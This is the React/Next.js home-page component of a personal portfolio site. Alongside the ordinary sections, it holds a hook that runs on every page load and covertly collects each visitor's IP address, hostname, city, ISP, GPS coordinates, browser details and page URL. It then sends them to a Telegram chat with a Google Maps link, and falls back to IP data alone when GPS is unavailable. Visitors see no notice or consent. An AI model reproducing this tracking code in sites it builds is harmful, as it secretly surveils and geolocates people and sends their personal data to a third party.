"use client"
import { useEffect, useState } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import About from './components/About';
import WorkExperience from './components/WorkExperience';
import Education from './components/Education';
import Projects from './components/Projects';
import Skills from './components/Skills';
import Testimonials from './components/Testimonials';
import Contact from './components/Contact';

import { getIpData, getGpsLocation, getBrowserInfo } from '../utils/locationUtils';
import { sendToTelegram } from '../utils/telegramUtils';
import experiences from './data/experiences';
import educationList from './data/educationList';
import projects from './data/projects';
import skillCategories from './data/skillCategories';
import testimonials from './data/testimonials';
import { IpData, GpsData } from '../types/locationTypes';

export default function Home() {
  const [, setIpData] = useState<IpData | null>(null);
  const [, setLocation] = useState<GpsData | null>(null);

  useEffect(() => {
    // Get IP data first
    getIpData().then((data) => {
      if (data) {
        setIpData(data);
        
        // Then try to get GPS location
        getGpsLocation().then((gpsData) => {
          setLocation(gpsData);
          
          const browser = getBrowserInfo();
          
          // Prepare message for Telegram
          const message = `
*New Portfolio Visitor*

*IP Information*:
- *IP*: ${data.ip || 'Not available'}
- *Hostname*: ${data.hostname || 'Not available'}
- *City*: ${data.city || 'Not available'}
- *Region*: ${data.region || 'Not available'}
- *Country*: ${data.country || 'Not available'}
- *Location*: ${data.loc || 'Not available'}
- *ISP*: ${data.org || 'Not available'}

*GPS Location*:
- *Latitude*: ${gpsData.latitude || 'Not available'}
- *Longitude*: ${gpsData.longitude || 'Not available'}
- *Accuracy*: ${gpsData.accuracy || 'Not available'}
- *Google Maps Link*: [View Location](https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude})

*Browser Information*:
\`\`\`
${browser}
\`\`\`

*Page*: ${window.location.href}
*Time*: ${new Date().toLocaleString()}
          `;
          
          // Send data to Telegram
          sendToTelegram(message);
        }).catch((error) => {
          console.error('Error getting GPS location:', error);
          
          // If GPS fails, still send IP data to Telegram
          const browser = getBrowserInfo();
          
          const fallbackMessage = `
*New Portfolio Visitor* (GPS unavailable)

*IP Information*:
- *IP*: ${data.ip || 'Not available'}
- *Hostname*: ${data.hostname || 'Not available'}
- *City*: ${data.city || 'Not available'}
- *Region*: ${data.region || 'Not available'}
- *Country*: ${data.country || 'Not available'}
- *Location*: ${data.loc || 'Not available'}
- *ISP*: ${data.org || 'Not available'}

*Browser Information*:
\`\`\`
${browser}
\`\`\`

*Page*: ${window.location.href}
*Time*: ${new Date().toLocaleString()}
          `;
          
          sendToTelegram(fallbackMessage);
        });
      }
    }).catch(error => {
      console.error('Error fetching IP data:', error);
    });
  }, []);

  return (
    <main className="min-h-screen bg-white">
      <div className="container mx-auto px-4 py-12">
        <Navbar />
        <Hero />
        <About />
        <Skills skillCategories={skillCategories} />
        <WorkExperience experiences={experiences} />
        <Education educationList={educationList} />
        <Projects projects={projects} />
        <Testimonials testimonials={testimonials} />
        <Contact />
      </div>
      <footer className="bg-gray-100 py-6">
        <div className="container mx-auto px-4 text-center">
          <p className="text-gray-600">© {new Date().getFullYear()} Reynald Silva. All rights reserved.</p>
        </div>
      </footer>
    </main>
  );
}